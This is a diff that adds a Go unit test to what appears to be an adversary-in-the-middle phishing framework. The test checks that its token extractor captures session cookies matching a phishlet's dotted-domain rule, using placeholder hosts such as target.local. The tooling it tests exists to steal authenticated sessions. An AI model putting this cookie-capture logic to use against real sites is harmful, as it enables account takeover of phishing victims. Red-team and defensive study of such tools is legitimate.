@@ -107,6 +107,43 @@ func TestTokenExtractor_SessionCompleted(t *testing.T) {
 	}
 }
 
+// TestTokenExtractor_DottedDomainRule verifies that an auth_token rule with a
+// leading-dot domain (e.g. ".target.local") matches both the apex domain and
+// subdomains, which is the standard phishlet authoring convention.
+func TestTokenExtractor_DottedDomainRule(t *testing.T) {
+	cases := []struct {
+		cookieDomain string
+		ruleDomain   string
+		wantCapture  bool
+	}{
+		{".target.local", ".target.local", true},      // apex with leading dots on both
+		{"target.local", ".target.local", true},       // apex, no leading dot on cookie
+		{"login.target.local", ".target.local", true}, // subdomain matches dotted rule
+		{".other.local", ".target.local", false},      // different domain
+	}
+	for _, tc := range cases {
+		sessions := &stubSessionCompleter{}
+		h := &response.TokenExtractor{Sessions: sessions, Logger: discardLogger()}
+		resp := newResp(http.StatusOK, "text/html", "")
+		resp.Header.Add("Set-Cookie", "tok=v; Domain="+tc.cookieDomain+"; Path=/")
+		ctx := &aitm.ProxyContext{
+			Session: &aitm.Session{ID: "s"},
+			Phishlet: &aitm.Phishlet{
+				AuthTokens: []aitm.TokenRule{
+					{Type: aitm.TokenTypeCookie, Domain: tc.ruleDomain},
+				},
+			},
+		}
+		if err := h.Handle(ctx, resp); err != nil {
+			t.Fatalf("cookie=%q rule=%q: unexpected error: %v", tc.cookieDomain, tc.ruleDomain, err)
+		}
+		captured := sessions.updated != nil
+		if captured != tc.wantCapture {
+			t.Errorf("cookie=%q rule=%q: captured=%v, want %v", tc.cookieDomain, tc.ruleDomain, captured, tc.wantCapture)
+		}
+	}
+}
+
 func TestTokenExtractor_SessionCompleted_NilWhitelist(t *testing.T) {
 	sessions := &stubSessionCompleter{isCompleteResult: true}
 	h := &response.TokenExtractor{
